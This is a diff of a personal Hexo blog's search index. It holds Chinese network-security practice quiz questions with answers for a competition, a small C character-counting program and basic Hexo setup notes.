-<p>9．防火墙在网络层中根据数据包中包头信息有选择地实施允许和阻断。这种技术是（  ）</p>
-<p>A. 应用网管技术   B. 状态检测技术     C. 包过滤技术     D. 代理服务器技术</p>
-<p>10．误用检测的优点不包括（  ）</p>
-<p>A. 检测准确度高                     B. 能够检测出新的网络攻击</p>
-<p>C. 便于系统维护                     D. 技术相对成熟的网络攻击</p>
-<p>答案：1.C 2.A 3.D 4.A 5.B 6.C 7.B 8.A 9.C 10.B</p>
-<p>1．  访问控制需要确定（  ）</p>
-<p>A. 用户权限                   B. 可给予那些主体访问控制权利</p>
-<p>C. 可被用户访问的资源         D. 系统是否遭入侵</p>
-<p>2．  威胁是一个可能破坏信息系统环境安全的动作或事件，威胁包括（  ）</p>
-<p>A. 目标       B. 代理       C. 事件     D. 上面三项都是</p>
-<p>3．完整性服务提供信息的正确性，为了对抗篡改攻击该服务必须和（  ）</p>
-<p>  A. 机密性服务配合工作       B. 可用性服务配合工作</p>
-<p>C. 可审性配合工作           D. 以上三项都是</p>
-<p>4．基于通信双方公共拥有的但是不为别人知道的秘密，利用计算机强大的计算能力，以该机密作为加密和密钥认证是（  ）</p>
-<p>  A. 公钥认证     B.  零知识认证    C.  共享密钥认证     D. 口令认证</p>
-<p>5．ISO安全体系结构中的对象认证安全服务使用（  ）</p>
-<p>A. 加密机制完成                   B. 数字签名机制完成 </p>
-<p> C. 访问控制机制完成               D. 数据完整性机制完成</p>
-<p>6．在ISO/OSI定义的安全体系结构中没有规定（  ）</p>
-<p>A. 对象认证服务                B. 访问控制安全服务</p>
-<p> C. 数据保密性安全服务          D. 数据可用性安全服务</p>
-<p>7．SSL产生绘画密钥的方式是（  ）</p>
-<p>A. 从密钥管理数据库中获得             </p>
-<p>B. 每一台客户机分配一个密钥的方式</p>
-<p>C. 随机由客户机产生并加密后通知服务器 </p>
-<p>D. 由服务器产生并分配给客户机</p>
-<p>8．属于第二层的VPN隧道协议有（  ）</p>
-<p>A. IPsec      B. PPTP      Ｃ. GRE　　 Ｄ. 以上皆不是</p>
-<p>9．入侵检测系统的检测分析技术主要有两大类它们是（　）</p>
-<p>Ａ. 特征检测和模型推理　         Ｂ. 异常检测和误用检测　</p>
-<p>Ｃ. 异常检测和概率检测           Ｄ. 主机检测和网络检测</p>
-<p>10．为了降低风险不建议使用的Ｉｎｔｅｒｎｅｔ服务是（　）</p>
-<p>　Ａ. Web服务　   B. 外部访问内部系统　　 C. 内部访问internet     D. FTP服务</p>
-<p> 答案：1.B  2.D 3.C  4.C  5.B  6.D  7.C  8.B  9.B  10.D</p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> diary </tag>
+            
+            <tag> 攻防世界 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Read more</title>
+      <link href="/2021/09/19/more/"/>
+      <url>/2021/09/19/more/</url>
+      
+        <content type="html"><![CDATA[<p>摘要</p><span id="more"></span><p>正文</p>]]></content>
+      
+      
       <categories>
-        <category>Diary</category>
+          
+          <category> Text </category>
+          
       </categories>
-      <tags>
-        <tag>diary</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>黑盾杯准备</title>
-    <url>/2021/11/28/%E9%BB%91%E7%9B%BE%E6%9D%AF%E5%87%86%E5%A4%87/</url>
-    <content><![CDATA[<p>1．  网络安全是在分布网络环境中对（  ）</p>
-<p>A. 信息载体提供安全保护                B. 信息的处理、传输提供安全保护</p>
-<p>C. 信息的存储、访问提供安全保护        D. 上面3项都是</p>
-<p>2．  对攻击可能性的分析在很大程度上带有（  ）</p>
-<p>A. 客观性       B. 主观性       C. 盲目性       D. 以上3项</p>
-<span id="more"></span>
-
-<p>3．  机密性服务提供信息的保密，机密性服务包括（  ）</p>
-<p>A. 文件机密性      B. 信息传输机密性     C. 通信流的机密性     D. 以上3项</p>
-<p>4．  网络协议的关键成分是（  ）</p>
-<p>A. 硬件、软件与数据                B. 语法、语义、体系结构</p>
-<p>C. 语法、定时、层次结构            D. 语法、语义、定时</p>
-<p>5．  可以被数据完整性机制防止的攻击方式是（  ）</p>
-<p>A. 假冒源地址或用户的地址欺骗攻击</p>
-<p>B. 抵赖做过信息的递交行为</p>
-<p>C. 数据中途被攻击者窃听获取</p>
-<p>D. 数据在途中被攻击者篡改或破坏</p>
-<p>6．  VPN的加密手段是（  ）</p>
-<p>A. 具有加密功能的防火墙</p>
-<p>B. 带有加密功能的路由器</p>
-<p>C. VPN内的各台主机对各自的信息进行相应的加密</p>
-<p>D. 单独的加密设备</p>
-<p>7．  通常所说的移动VPN是指（  ）</p>
-<p>A. Access VPN    B. Intranel VPN    C. Extranet VPN    D. 以上都不是</p>
-<p>8．入侵检测系统的检测分析技术主要有两大类，它们是（  ）</p>
-<p>A. 特征检测和模型检测          B. 异常检测和误用检测</p>
-<p>C. 异常检测和概率检测          D. 主机检测和网络检测</p>
-<p>9．身份鉴别是安全服务中的重要一环，以下关于身份鉴别的叙述不正确的是（  ）</p>
-<p>A. 身份鉴别是授权控制的基础</p>
-<p>B. 身份鉴别一般不用提供双向认证</p>
-<p>C. 目前一跟般采用基于对称密钥或公开密钥加密的方法</p>
-<p>D. 数据签名机制是实现身份鉴别的重要机制</p>
-<p>10．对动态网络地址转换（NAT），不正确的说法是（  ）</p>
-<p>A. 将很多内部地址映射到单个真实地址</p>
-<p>B. 外部网络地址和内部地址一对一的映射</p>
-<p>C. 最多可有64000个同时的动态NAT连接</p>
-<p>D. 每个连接使用一个端口</p>
-<p>答案：1.D 2.B 3.D 4.D 5.D 6.C 7.A 8.B 9.B 10.B</p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> text </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>关于搭建Hexo博客</title>
+      <link href="/2021/09/18/%E5%85%B3%E4%BA%8E%E6%90%AD%E5%BB%BAHexo%E5%8D%9A%E5%AE%A2/"/>
+      <url>/2021/09/18/%E5%85%B3%E4%BA%8E%E6%90%AD%E5%BB%BAHexo%E5%8D%9A%E5%AE%A2/</url>
+      
+        <content type="html"><![CDATA[<p>**<u><a href="https://www.cnblogs.com/huanhao/p/markdown.html">https://www.cnblogs.com/huanhao/p/markdown.html</a></u>**直接看这个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">hexo clean                           #清除缓存</span><br><span class="line">hexo g                               #生成页面</span><br><span class="line">hexo d                               #部署到github</span><br><span class="line">hexo s                               #本地预览</span><br><span class="line">hexo new &quot;标题&quot;                      #新建博客</span><br><span class="line">##小标题内容                          #小标题</span><br><span class="line">###小小标题内容                       #小小标题</span><br><span class="line">[自注网页名称]（网址）                 #在博客中添加网站链接</span><br><span class="line">！[](网址)                           #在博客中添加图片</span><br><span class="line"></span><br><span class="line">**设置****Description**    **默认**</span><br><span class="line">layout           layout    post 或 page</span><br><span class="line">title           文章标题     文档名</span><br><span class="line">date           创建日期    文档的创建日期</span><br><span class="line">updated           修改日期    文档的修改日期</span><br><span class="line">comment            是否开启评论      true</span><br><span class="line">tags           标签              NULL</span><br><span class="line">categories   分类              NULL</span><br><span class="line">permalink   url 中的名字     文档名</span><br><span class="line">thumbnail   文章缩略图      NULL</span><br><span class="line">banner       文章缩略图&amp;文章首部      NULL</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
       <categories>
-        <category>Diary</category>
+          
+          <category> Diary </category>
+          
       </categories>
-      <tags>
-        <tag>diary</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>输入一行字符，分别统计出其中英文字母 空格 数字和其他字符的个数</title>
-    <url>/2021/10/31/%E8%BE%93%E5%85%A5%E4%B8%80%E8%A1%8C%E5%AD%97%E7%AC%A6%EF%BC%8C%E5%88%86%E5%88%AB%E7%BB%9F%E8%AE%A1%E5%87%BA%E5%85%B6%E4%B8%AD%E8%8B%B1%E6%96%87%E5%AD%97%E6%AF%8D-%E7%A9%BA%E6%A0%BC-%E6%95%B0%E5%AD%97%E5%92%8C%E5%85%B6%E4%BB%96%E5%AD%97%E7%AC%A6%E7%9A%84%E4%B8%AA%E6%95%B0/</url>
-    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"> char c;</span><br><span class="line"> int letters=0,space=0,digit=0,other=0;</span><br><span class="line"> printf(&quot;请输入一行字符：&quot;);</span><br><span class="line"> while ((c=getchar())!=&#x27;\n&#x27;)&#123;</span><br><span class="line">  if (c&gt;=&#x27;a&#x27;&amp;&amp;c&lt;=&#x27;z&#x27;||c&gt;=&#x27;A&#x27;&amp;&amp;c&lt;=&#x27;Z&#x27;)</span><br><span class="line">   letters++;</span><br><span class="line">  else if (c==&#x27; &#x27;)</span><br><span class="line">   space++;</span><br><span class="line">  else if (c&gt;=&#x27;0&#x27;&amp;&amp;c&lt;=&#x27;9&#x27;)</span><br><span class="line">   digit++;</span><br><span class="line">  else </span><br><span class="line">   other++;</span><br><span class="line"> &#125;</span><br><span class="line"> printf(&quot;字母数:%d\n空格数:%d\n数字数:%d\n其他字符:%d\n&quot;,letters,space,digit,other);</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+        <tags>
+            
+            <tag> diary </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Text</title>
+      <link href="/2021/09/18/TEXT/"/>
+      <url>/2021/09/18/TEXT/</url>
+      
+        <content type="html"><![CDATA[<h2 id="注意：这是一个测试博客，无意义"><a href="#注意：这是一个测试博客，无意义" class="headerlink" title="注意：这是一个测试博客，无意义"></a>注意：这是一个测试博客，无意义</h2><span id="more"></span><p><a href="https://songkaiai.github.io/">主页套娃</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rororororororororororo[主页套娃](https://songkaiai.github.io/)</span><br></pre></td></tr></table></figure><p><img src="https://s3.bmp.ovh/imgs/2021/09/38c8decbd8b23493.png" alt="水晶雫"></p>]]></content>
+      
+      
       <categories>
-        <category>C语言</category>
+          
+          <category> Text </category>
+          
       </categories>
-      <tags>
-        <tag>diary</tag>
-      </tags>
-  </entry>
+      
+      
+        <tags>
+            
+            <tag> text </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Hello World</title>
+      <link href="/2021/09/18/hello-world/"/>
+      <url>/2021/09/18/hello-world/</url>
+      
+        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+  
+  
 </search>
